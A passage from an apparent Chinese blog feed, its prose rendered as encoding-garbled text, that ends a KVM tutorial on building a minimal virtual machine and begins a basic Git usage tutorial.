class="hljs-keyword">if</span> (ioctl(vcpu-&gt;fd, KVM_SET_SREGS, &amp;(vcpu-&gt;sregs)) &lt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;failed to set sregs.\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><br><span class="hljs-comment">// é€šè¿‡ ioctl è·å–è™šæ‹Ÿå¤„ç†å™¨çš„é€šç”¨å¯„å­˜å™¨ï¼ˆgeneral-purpose registersï¼‰</span><br><span class="hljs-keyword">if</span> (ioctl(vcpu-&gt;fd, KVM_GET_REGS, &amp;(vcpu-&gt;regs)) &lt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;failed to get regs.\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><br>vcpu-&gt;regs.rip = <span class="hljs-number">0x0</span>;               <span class="hljs-comment">// è®¾ç½®æŒ‡ä»¤æŒ‡é’ˆåˆå§‹å€¼ä¸º0</span><br>vcpu-&gt;regs.rflags = <span class="hljs-number">0x2</span>;            <span class="hljs-comment">// è®¾ç½® rflags å¯„å­˜å™¨ï¼Œä¿ç•™ç¬¬2ä½ï¼Œå…¶ä½™ä½åˆå§‹åŒ–ä¸º0</span><br><br><span class="hljs-comment">// å°†æ›´æ–°åçš„ regs é‡æ–°è®¾ç½®ç»™è™šæ‹Ÿå¤„ç†å™¨</span><br><span class="hljs-keyword">if</span> (ioctl(vcpu-&gt;fd, KVM_SET_REGS, &amp;(vcpu-&gt;regs)) &lt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;failed to set regs.\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><br><span class="hljs-comment">// ... å…¶ä»–è®¾ç½® ...</span><br><br><br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="1-5-4-Guest"><a href="#1-5-4-Guest" class="headerlink" title="1.5.4 Guest"></a>1.5.4 Guest</h3><p>å®ç°ä¸€ä¸ªéå¸¸å°çš„Guestï¼šè¿™ä¸ªGuestå°±æ˜¯ä¸€ä¸ªç®€å•çš„æ— é™å¾ªç¯</p><p>è¿™ä¸ªGuestçš„å†…æ ¸ä¸­æ²¡æœ‰ä»»ä½•æ–‡ä»¶æ ¼å¼è§£ç å™¨ï¼Œéœ€è¦å°†Guestç¼–è¯‘ä¸ºæ— æ ¼å¼çš„ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä½¿ç”¨objcopyä»ELFæ ¼å¼è½¬æ¢ä¸ºbinaryæ ¼å¼ï¼Œä»£ç ä»åœ°å€0å¼€å§‹ã€‚è¿™ä¸ªGuestæ²¡æœ‰ä»»ä½•ä¾èµ–ï¼Œæ‰€ä»¥ä¸è¿æ¥ä»»ä½•å…¶ä»–çš„ç¬¬ä¸‰æ–¹åº“</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// guest/kernel.S</span><br>.code16gcc<br>.text<br>.globl _start<br>.type _start, @function<br>_start:<br><span class="hljs-number">1</span>:<br>jmp <span class="hljs-number">1b</span>       <span class="hljs-comment">// æ— é™å¾ªç¯ï¼Œä¸æ–­è·³è½¬åˆ°æ ‡å·1å¤„ï¼Œåˆ›å»ºä¸€ä¸ªç®€å•çš„æ— é™å¾ªç¯ã€‚</span><br><br><span class="hljs-comment">// Makefile æ–‡ä»¶ç”¨äºç¼–è¯‘å’Œç”Ÿæˆ Guest å†…æ ¸çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚</span><br><span class="hljs-comment">// guest/Makefile</span><br>BIN := kernel.bin<br>ELF := kernel.elf<br>OBJ := kernel.o<br><br>all: $(BIN)   <span class="hljs-comment">// å®šä¹‰é»˜è®¤ç›®æ ‡ allï¼Œç”Ÿæˆ kernel.bin å¯æ‰§è¡Œæ–‡ä»¶ã€‚</span><br><br>$(BIN): $(ELF) <span class="hljs-comment">// ç”Ÿæˆ kernel.bin ä¾èµ–äº kernel.elf æ–‡ä»¶ã€‚</span><br>    objcopy -O binary $&lt; $@ <span class="hljs-comment">// ä½¿ç”¨ objcopy å°† ELF æ–‡ä»¶è½¬æ¢ä¸º binary æ ¼å¼ã€‚</span><br><br>$(ELF): $(OBJ) <span class="hljs-comment">// ç”Ÿæˆ kernel.elf ä¾èµ–äº kernel.o ç›®æ ‡æ–‡ä»¶ã€‚</span><br>    $(LD) -Ttext=<span class="hljs-number">0x00</span> -nostdlib -<span class="hljs-keyword">static</span> $&lt; -o $@ <span class="hljs-comment">// é“¾æ¥ç›®æ ‡æ–‡ä»¶</span><br><br>%.o: %.S <span class="hljs-comment">// å®šä¹‰ä¸€èˆ¬è§„åˆ™ï¼Œç”¨äºå°†æ±‡ç¼–æ–‡ä»¶ç¼–è¯‘ä¸ºç›®æ ‡æ–‡ä»¶ã€‚</span><br>    $(CC) -nostdinc -c $&lt; -o $@<br><br>clean: <span class="hljs-comment">// å®šä¹‰ clean ç›®æ ‡ï¼Œç”¨äºæ¸…é™¤ç”Ÿæˆçš„æ–‡ä»¶ã€‚</span><br>    rm -rf $(OBJ) $(BIN) $(ELF)<br><br></code></pre></td></tr></table></figure><h3 id="1-5-5-åŠ è½½Guesté•œåƒåˆ°å†…å­˜"><a href="#1-5-5-åŠ è½½Guesté•œåƒåˆ°å†…å­˜" class="headerlink" title="1.5.5 åŠ è½½Guesté•œåƒåˆ°å†…å­˜"></a>1.5.5 åŠ è½½Guesté•œåƒåˆ°å†…å­˜</h3><p>åˆå§‹åŒ–VCPUæ—¶æˆ‘ä»¬å°†ä»£ç æ®µcsè®¾ç½®ä¸º0xf000ï¼Œå°†ripè®¾ç½®ä¸º0ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦å°†Guesté•œåƒåŠ è½½åˆ°Guestçš„å†…å­˜åœ°å€(0x1000ï¼œï¼œ4)+0x0å¤„ã€‚Guestçš„ç‰©ç†å†…å­˜çš„èµ·å§‹åœ°å€ä¸ºram_startï¼Œæ‰€ä»¥åŠ è½½Guesté•œåƒåˆ°å†…å­˜çš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">load_image</span><span class="hljs-params">(struct vm *vm)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> fd = open(<span class="hljs-string">&quot;./guest/kernel.bin&quot;</span>, O_RDONLY); <span class="hljs-comment">// æ‰“å¼€Guesté•œåƒæ–‡ä»¶</span><br>    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;can not open guest image\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">// è®¡ç®—GueståŠ è½½åˆ°å†…å­˜çš„ç‰©ç†åœ°å€</span><br>    <span class="hljs-keyword">char</span> *p = (<span class="hljs-keyword">char</span> *)vm-&gt;ram_start + ((<span class="hljs-number">0x1000</span> &lt;&lt; <span class="hljs-number">4</span>) + <span class="hljs-number">0x0</span>);<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-comment">// ä»æ–‡ä»¶ä¸­è¯»å–æ•°æ®å¹¶å†™å…¥å†…å­˜</span><br>        <span class="hljs-keyword">if</span> ((ret = read(fd, p, <span class="hljs-number">4096</span>)) &lt;= <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">break</span>;<br>        p += ret; <span class="hljs-comment">// æ›´æ–°å†…å­˜æŒ‡é’ˆ</span><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>è¿™æ®µä»£ç çš„ç›®çš„æ˜¯å°†Guesté•œåƒæ–‡ä»¶åŠ è½½åˆ°è™šæ‹Ÿæœºçš„å†…å­˜ä¸­ã€‚å®ƒé¦–å…ˆ<strong>æ‰“å¼€åä¸º â€œ./guest/kernel.binâ€ çš„Guesté•œåƒæ–‡ä»¶</strong>ï¼Œç„¶åé€šè¿‡è®¡ç®—å¾—åˆ°Guesté•œåƒåº”è¯¥åŠ è½½åˆ°å†…å­˜ä¸­çš„ç‰©ç†åœ°å€ã€‚æ¥ä¸‹æ¥ï¼Œé€šè¿‡å¾ªç¯ä»æ–‡ä»¶ä¸­è¯»å–æ•°æ®ï¼Œæ¯æ¬¡æœ€å¤šè¯»å– 4096 å­—èŠ‚ï¼ˆä¸€ä¸ªé¡µé¢çš„å¤§å°ï¼‰ï¼Œç„¶åå°†è¯»å–çš„æ•°æ®å†™å…¥åˆ°å†…å­˜ä¸­ã€‚è¿™ä¸ªè¿‡ç¨‹ä¼šä¸€ç›´è¿›è¡Œï¼Œç›´åˆ°æ–‡ä»¶çš„å†…å®¹è¢«å®Œå…¨è¯»å–å¹¶å†™å…¥å†…å­˜ï¼Œæˆ–è€…å‘ç”Ÿäº†è¯»å–é”™è¯¯ã€‚åœ¨æ¯æ¬¡å¾ªç¯ä¸­ï¼Œå†…å­˜æŒ‡é’ˆä¼šè¢«æ›´æ–°ï¼Œä»¥ä¾¿åœ¨ä¸‹æ¬¡å¾ªç¯ä¸­å†™å…¥æ•°æ®çš„æ—¶å€™ä¸ä¼šè¦†ç›–ä¹‹å‰çš„æ•°æ®ã€‚</p><h3 id="1-5-6-è¿è¡Œè™šæ‹Ÿæœº"><a href="#1-5-6-è¿è¡Œè™šæ‹Ÿæœº" class="headerlink" title="1.5.6 è¿è¡Œè™šæ‹Ÿæœº"></a>1.5.6 è¿è¡Œè™šæ‹Ÿæœº</h3><p>ä¸‹é¢æ˜¯å¯¹ä»£ç å’Œæ–‡æœ¬çš„è¯¦ç»†è§£é‡Šï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// å¯åŠ¨è™šæ‹Ÿæœºçš„å‡½æ•°</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">run_vm</span><span class="hljs-params">(struct vm *vm)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-comment">// ä½¿ç”¨ ioctl è°ƒç”¨ KVM_RUN å‘½ä»¤æ¥å¯åŠ¨è™šæ‹Ÿæœºè¿è¡Œ</span><br>        <span class="hljs-keyword">if</span> ((ioctl(vm-&gt;vcpu[<span class="hljs-number">0</span>]-&gt;fd, KVM_RUN, <span class="hljs-number">0</span>)) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;failed to run kvm.\n&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>è¿™æ®µä»£ç ä¸­çš„å‡½æ•° <code>run_vm</code> æ˜¯ç”¨æ¥å¯åŠ¨è™šæ‹Ÿæœºçš„ã€‚å®ƒè¿›å…¥äº†ä¸€ä¸ªæ— é™çš„å¾ªç¯ï¼Œæ¯æ¬¡å¾ªç¯éƒ½é€šè¿‡ ioctl è°ƒç”¨å‘é€ KVM_RUN å‘½ä»¤ï¼Œä»è€Œå¯åŠ¨è™šæ‹Ÿæœºçš„è¿è¡Œã€‚åœ¨è¿™ä¸ªå¾ªç¯ä¸­ï¼Œè™šæ‹Ÿæœºä¼šè¢«ä¸æ–­åœ°æ‰§è¡Œï¼Œç›´åˆ°æŸä¸ªæ¡ä»¶ä½¿å¾—è™šæ‹Ÿæœºé€€å‡ºåˆ°ç”¨æˆ·ç©ºé—´ã€‚</p><p>åœ¨è§£é‡Šå®Œä»£ç åï¼Œæ¥ä¸‹æ¥æ˜¯å¯¹æ“ä½œæ­¥éª¤çš„è§£é‡Šï¼š</p><ol><li>ç¼–è¯‘ kmm.c æ–‡ä»¶ï¼šé€šè¿‡æ‰§è¡Œå‘½ä»¤ <code>gcc kvm.c -o kvm</code>ï¼Œå°† <code>kvm.c</code> ç¼–è¯‘æˆåä¸º <code>kvm</code> çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚</li><li>è¿è¡Œè™šæ‹Ÿæœºï¼šé€šè¿‡æ‰§è¡Œå‘½ä»¤ <code>sudo ./kvm</code>ï¼Œä»¥è¶…çº§ç”¨æˆ·æƒé™è¿è¡Œç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚</li><li>åœ¨å¦ä¸€ä¸ªç»ˆç«¯ä¸­è¿è¡Œ <code>pidstat</code> å‘½ä»¤ï¼šæ‰§è¡Œå‘½ä»¤ <code>pidstat -p</code> pidof kvm <code>1</code>ï¼Œç›‘è§†è™šæ‹Ÿæœºè¿›ç¨‹çš„èµ„æºä½¿ç”¨æƒ…å†µã€‚å…¶ä¸­ <code>-p</code> pidof kvm`` å‚æ•°æŒ‡å®šè¦ç›‘è§†çš„è¿›ç¨‹å·ï¼Œ<code>1</code> è¡¨ç¤ºæ¯ç§’è¾“å‡ºä¸€æ¬¡ç›‘è§†ç»“æœã€‚</li><li>è§‚å¯Ÿç›‘è§†ç»“æœï¼šå¦‚æœä¸€åˆ‡æ­£å¸¸ï¼Œ<code>pidstat</code> å‘½ä»¤çš„è¾“å‡ºä¼šæ˜¾ç¤ºæ¯ä¸ªé‡‡æ ·æ—¶åˆ»çš„è™šæ‹Ÿæœºè¿›ç¨‹çš„èµ„æºåˆ©ç”¨ç‡ã€‚åœ¨æ­£å¸¸æƒ…å†µä¸‹ï¼Œç”±äºè™šæ‹Ÿæœºä¸­åªæœ‰ä¸€ä¸ªç®€å•çš„æ— é™å¾ªç¯ï¼Œå®ƒä¸ä¼šä¸»åŠ¨è§¦å‘é™·å…¥ï¼Œå› æ­¤è™šæ‹Ÿæœºçš„ CPU åˆ©ç”¨ç‡ä¼šæ¥è¿‘ 100%ã€‚åŒæ—¶ï¼Œç”±äºè™šæ‹Ÿæœºå¹¶æ²¡æœ‰è¿›è¡Œå¤æ‚çš„æ“ä½œï¼Œå› æ­¤åœ¨ Host ç³»ç»Ÿæ€ï¼ˆ%systemï¼‰æ–¹é¢çš„èµ„æºä½¿ç”¨ç‡ä¼šéå¸¸ä½ï¼Œæ¥è¿‘ 0ã€‚</li></ol><p>è¿™ä¸ªè¿‡ç¨‹å±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨ KVM åœ¨ç”¨æˆ·ç©ºé—´åˆ›å»ºä¸€ä¸ªç®€å•çš„è™šæ‹Ÿæœºï¼Œå¹¶è®©è™šæ‹Ÿæœºåœ¨æ— é™å¾ªç¯ä¸­è¿è¡Œï¼Œä»è€Œå®ç°è™šæ‹ŸåŒ–ã€‚</p><h1 id="äºŒã€å†…å­˜è™šæ‹ŸåŒ–"><a href="#äºŒã€å†…å­˜è™šæ‹ŸåŒ–" class="headerlink" title="äºŒã€å†…å­˜è™šæ‹ŸåŒ–"></a>äºŒã€å†…å­˜è™šæ‹ŸåŒ–</h1>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Gitçš„ä½¿ç”¨</title>
    <link href="/p/3645f6a9/"/>
    <url>/p/3645f6a9/</url>
    
    <content type="html"><![CDATA[<h1 id="Git-ç®€ä»‹"><a href="#Git-ç®€ä»‹" class="headerlink" title="Git ç®€ä»‹"></a>Git ç®€ä»‹</h1><p>Git æ˜¯ä¸€ä¸ªåˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶å·¥å…·ï¼Œæœ€åˆç‰ˆæœ¬ç”±Linuxä¹‹çˆ¶Linusåœ¨ä¸€å‘¨ä¹‹å†…å¼€å‘å®Œæˆï¼Œç›®çš„æ˜¯ä¸ºäº†è§£å†³Linuxå†…æ ¸ç»´æŠ¤å·¥ä½œçš„ä»£ç åŒæ­¥ï¼ˆä¸å¾—ä¸æ„Ÿå¹æçº³æ–¯ç®€ç›´æ˜¯ç¥å•Šï¼‰</p><h1 id="Git-ä¸å…¶ä»–ç‰ˆæœ¬æ§åˆ¶å·¥å…·çš„å·®å¼‚"><a href="#Git-ä¸å…¶ä»–ç‰ˆæœ¬æ§åˆ¶å·¥å…·çš„å·®å¼‚" class="headerlink" title="Git ä¸å…¶ä»–ç‰ˆæœ¬æ§åˆ¶å·¥å…·çš„å·®å¼‚"></a>Git ä¸å…¶ä»–ç‰ˆæœ¬æ§åˆ¶å·¥å…·çš„å·®å¼‚</h1><ul><li>åˆ«çš„ç‰ˆæœ¬æ§åˆ¶å·¥å…·ä¾§é‡æ–‡ä»¶å†…å®¹çš„å…·ä½“å·®å¼‚</li><li>Git å…³å¿ƒæ–‡ä»¶æ•°æ®çš„æ•´ä½“æ˜¯å¦å‘ç”Ÿå˜åŒ–ï¼ŒæŠŠå˜åŒ–çš„æ–‡ä»¶ä½œ<code>å¿«ç…§</code></li><li>Git å¹¶ä¸ä¿å­˜è¿™äº›å‰åå˜åŒ–çš„å·®å¼‚æ•°æ®ï¼Œè€Œæ˜¯å¯¹æ•°æ®å¾—åˆ°è¿›è¡Œsha-1æ‘˜è¦ï¼Œå¹¶å°†æ­¤ç»“æœä½œä¸ºæ•°æ®çš„å”¯ä¸€æ ‡è¯†å’Œç´¢å¼•ï¼Œè‹¥æ–‡ä»¶æ²¡æœ‰å˜åŒ–ï¼ŒGit ä¸ä¼šå†æ¬¡ä¿å­˜</li></ul><h1 id="git-ä½¿ç”¨è¿‡ç¨‹"><a href="#git-ä½¿ç”¨è¿‡ç¨‹" class="headerlink" title="git ä½¿ç”¨è¿‡ç¨‹"></a>git ä½¿ç”¨è¿‡ç¨‹</h1><p>åˆ›å»ºæ–‡ä»¶å¤¹<br><img src="https://img-blog.csdnimg.cn/4dc955984f434346956e2a12f384d34a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16"><br>git init</p><p>ç”±äºåˆšåˆšåˆå§‹åŒ–ï¼Œæ­¤æ—¶æ˜¾ç¤ºOn branch masterï¼ŒNo commits yetï¼Œnothing to commit<br><img src="https://img-blog.csdnimg.cn/75be5369f0b94d0d83185350aad4f778.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16"><br>åˆ›å»ºæ–‡ä»¶å¹¶ä¿®æ”¹<br><img src="https://img-blog.csdnimg.cn/ec7e7b9e210347938b131c44820ea403.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16"><br>å°†æ–‡ä»¶æ”¾å…¥æš‚å­˜åŒº<br><img src="https://img-blog.csdnimg.cn/f427689f5dc84298a80a8461af55575c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16"><br>æäº¤åˆ°æœ¬åœ°<br><img src="https://img-blog.csdnimg.cn/c6d30b319f8c4b38b60597a00cf1ba2c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16"></p><h1 id="æ–‡ä»¶çš„å‡ ç§çŠ¶æ€"><a href="#æ–‡ä»¶çš„å‡ ç§çŠ¶æ€" class="headerlink" title="æ–‡ä»¶çš„å‡ ç§çŠ¶æ€"></a>æ–‡ä»¶çš„å‡ ç§çŠ¶æ€</h1><h2 id="ä¿®æ”¹ï¼ˆmodifiedï¼‰"><a href="#ä¿®æ”¹ï¼ˆmodifiedï¼‰" class="headerlink" title="ä¿®æ”¹ï¼ˆmodifiedï¼‰"></a>ä¿®æ”¹ï¼ˆmodifiedï¼‰</h2><p>ä¿®æ”¹äº†æŸä¸ªæ–‡ä»¶ï¼Œä½†è¿˜æ²¡æœ‰æäº¤ä¿å­˜</p><h2 id="æš‚å­˜ï¼ˆstagedï¼‰"><a href="#æš‚å­˜ï¼ˆstagedï¼‰" class="headerlink" title="æš‚å­˜ï¼ˆstagedï¼‰"></a>æš‚å­˜ï¼ˆstagedï¼‰</h2><p>æŠŠå·²ä¿®æ”¹çš„æ–‡ä»¶æ”¾åœ¨ä¸‹æ¬¡æäº¤æ—¶è¦ä¿å­˜çš„æ¸…å•ä¸­</p><h2 id="æäº¤ï¼ˆcommittedï¼‰"><a href="#æäº¤ï¼ˆcommittedï¼‰" class="headerlink" title="æäº¤ï¼ˆcommittedï¼‰"></a>æäº¤ï¼ˆcommittedï¼‰</h2><p>è¯¥æ–‡ä»¶å·²ç»è¢«å®‰å…¨åœ°ä¿å­˜åœ¨æœ¬åœ°æ•°æ®åº“ä¸­</p><h2 id="åŸºæœ¬çš„-Git-å·¥ä½œæµç¨‹"><a href="#åŸºæœ¬çš„-Git-å·¥ä½œæµç¨‹" class="headerlink" title="åŸºæœ¬çš„ Git å·¥ä½œæµç¨‹"></a>åŸºæœ¬çš„ Git å·¥ä½œæµç¨‹</h2><ul><li>åœ¨å·¥ä½œç›®å½•ï¼ˆworking directoryï¼‰ä¸­ä¿®æ”¹æŸäº›æ–‡ä»¶</li><li>å¯¹ä¿®æ”¹åçš„æ–‡ä»¶è¿›è¡Œå¿«ç…§ï¼Œç„¶åä¿å­˜åˆ°æš‚å­˜åŒºåŸŸï¼ˆstaging areaï¼‰</li><li>æäº¤æ›´æ–°ï¼ˆcommittedï¼‰ï¼Œå°†ä¿å­˜åœ¨æš‚å­˜åŒºåŸŸçš„æ–‡ä»¶å¿«ç…§æ°¸ä¹…è½¬å‚¨åˆ° Git ç›®å½•ä¸­</li></ul><p>ä¸‹é¢æ˜¯å·¥ä½œç›®å½•ï¼Œæš‚å­˜åŒºåŸŸï¼Œä»¥åŠæœ¬åœ°ä»“åº“ä¸‰è€…ä¹‹é—´çš„å…³ç³»<br><img src="https://img-blog.csdnimg.cn/81cb8dd07b1f48fba59ee63b7abcf72a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_13,color_FFFFFF,t_70,g_se,x_16"></p><h1 id="git-add"><a href="#git-add" class="headerlink" title="git add"></a>git add</h1><p> git add å‘½ä»¤ï¼Œæ ¹æ®ç›®æ ‡æ–‡ä»¶çš„çŠ¶æ€ä¸åŒï¼Œæ­¤å‘½ä»¤çš„æ•ˆæœä¹Ÿä¸åŒ</p><ul><li>å¯ä»¥ç”¨å®ƒå¼€å§‹è·Ÿè¸ªæ–°æ–‡ä»¶</li><li>æŠŠå·²è·Ÿè¸ªçš„æ–‡ä»¶æ”¾åˆ°æš‚å­˜åŒº</li><li>è¿˜èƒ½ç”¨äºåˆå¹¶æ—¶æŠŠæœ‰å†²çªçš„æ–‡ä»¶æ ‡è®°ä¸ºå·²è§£å†³çŠ¶æ€</li></ul><p><strong>å‘Šè¯‰ Git å¼€å§‹å¯¹è¿™äº›æ–‡ä»¶è¿›è¡Œè·Ÿè¸ª</strong></p><p>tracked ã€ untrackedåˆ†åˆ«æ ‡è¯†è·Ÿè¸ª/ä¸è·Ÿè¸ªã€‚å¯¹äºæ¯ä¸ªæ–‡ä»¶ï¼Œéƒ½åªèƒ½å¤„äºè¿™ä¸¤ç§çŠ¶æ€çš„å…¶ä¸­ä¸€ç§</p><p>å‡ ä¸ªè¦æ³¨æ„çš„ç‚¹ï¼š</p><ul><li>å·²è·Ÿè¸ªçš„æ–‡ä»¶æ˜¯æŒ‡è¢«çº³å…¥ç‰ˆæœ¬æ§åˆ¶ç®¡ç†çš„æ–‡ä»¶</li><li>æœªè¢«è·Ÿè¸ªçš„æ–‡ä»¶æ˜¯æŒ‡ä¸è¢«çº³å…¥ç‰ˆæœ¬æ§åˆ¶ç®¡ç†çš„æ–‡ä»¶</li><li>è¦ç¡®å®šå“ªäº›æ–‡ä»¶å½“å‰å¤„äºä»€ä¹ˆçŠ¶æ€ï¼Œå¯ä»¥ç”¨ git status å‘½ä»¤ï¼Œè‹¥æ˜¯ nothing to commit (working directory clean)ï¼Œåˆ™æ ‡è¯†ä½ ç°åœ¨çš„å·¥ä½œç›®å½•ç›¸å½“å¹²å‡€ã€‚æ¢å¥è¯è¯´ï¼Œæ‰€æœ‰å·²è·Ÿè¸ªæ–‡ä»¶åœ¨ä¸Šæ¬¡æäº¤åéƒ½æœªè¢«æ›´æ”¹è¿‡</li></ul><p><img src="https://img-blog.csdnimg.cn/c4d6d782124d450ba9870ee974597ac0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_13,color_FFFFFF,t_70,g_se,x_16"></p><h1 id="git-status"><a href="#git-status" class="headerlink" title="git status"></a>git status</h1><p>è¦ç¡®å®šå“ªäº›æ–‡ä»¶å½“å‰å¤„äºä»€ä¹ˆçŠ¶æ€ï¼Œå¯ä»¥ç”¨ git status å‘½ä»¤ï¼Œè‹¥æ˜¯ nothing to commit (working directory clean)ï¼Œåˆ™æ ‡è¯†ä½ ç°åœ¨çš„å·¥ä½œç›®å½•ç›¸å½“å¹²å‡€ã€‚æ¢å¥è¯è¯´ï¼Œæ‰€æœ‰å·²è·Ÿè¸ªæ–‡ä»¶åœ¨ä¸Šæ¬¡æäº¤åéƒ½æœªè¢«æ›´æ”¹è¿‡</p><h1 id="git-diff"><a href="#git-diff" class="headerlink" title="git diff"></a>git diff</h1><p> git status çš„æ˜¾ç¤ºä»…ä»…æ˜¯åˆ—å‡ºäº†ä¿®æ”¹è¿‡çš„æ–‡ä»¶ï¼Œå¦‚æœè¦æŸ¥çœ‹å…·ä½“ä¿®æ”¹äº†ä»€ä¹ˆåœ°æ–¹ï¼Œå¯ä»¥ç”¨ git diff å‘½ä»¤</p><ul><li>git diffï¼šæ­¤å‘½ä»¤æ¯”è¾ƒçš„æ˜¯å·¥ä½œç›®å½•ä¸­å½“å‰æ–‡ä»¶å’Œæš‚å­˜åŒºåŸŸå¿«ç…§ä¹‹é—´çš„å·®å¼‚ï¼Œä¹Ÿå°±æ˜¯ä¿®æ”¹ä¹‹åè¿˜æ²¡æœ‰æš‚å­˜èµ·æ¥çš„å˜åŒ–å†…å®¹</li><li>git diff â€“stagedï¼šå·²ç»æš‚å­˜èµ·æ¥çš„æ–‡ä»¶å’Œä¸Šæ¬¡æäº¤æ—¶çš„å¿«ç…§ä¹‹é—´çš„å·®å¼‚</li></ul><h1 id="git-ignore"><a href="#git-ignore" class="headerlink" title="git ignore"></a>git ignore</h1><p>å†™åœ¨git ignoreä¸­çš„æ–‡ä»¶æ— éœ€çº³å…¥ Git çš„ç®¡ç†ï¼Œæ¯”å¦‚è¯´ï¼Œåœ¨ç›®å½•ä¸‹åˆ›å»º.gitignoreæ–‡ä»¶ï¼Œç„¶ååœ¨æ–‡ä»¶ä¸­å†™å…¥ï¼š</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">*.<span class="hljs-keyword">c</span>    å¿½ç•¥æ‰€æœ‰çš„<span class="hljs-keyword">c</span>ç»“å°¾çš„æ–‡ä»¶<br><span class="hljs-title">!wdnmd.c</span> æ–‡ä»¶wdnm.<span class="hljs-keyword">c</span>ä¸æ”¾å…¥å¿½ç•¥æ²æµ´éœ²<br>/nmslåªå¿½ç•¥é¡¹ç›®æ 